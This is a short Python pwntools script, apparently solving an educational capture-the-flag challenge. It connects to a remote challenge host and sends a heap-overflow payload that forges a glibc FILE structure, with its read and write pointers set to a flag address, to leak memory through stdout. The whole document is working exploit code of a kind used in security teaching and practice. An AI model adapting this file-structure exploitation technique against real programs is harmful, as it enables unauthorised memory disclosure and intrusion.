from pwn import *

r = remote("edu-ctf.zoolab.org", 10010)

flag = 0x404050

data = b"A" * 0x10
data += p64(0) + p64(0x1e1)  # heap header
data += p64(0xfbad0800)      # flags
data += p64(0)               # read_ptr
data += p64(flag)            # read_end
data += p64(0)               # read_base
data += p64(flag)            # write_base
data += p64(flag + 0x10)     # write_ptr
data += p64(0)               # write_end
data += p64(0) * 2           # buf_*
data += p64(0) * 5           # others
data += b"\x01"              # fileno

r.send(data)
r.interactive()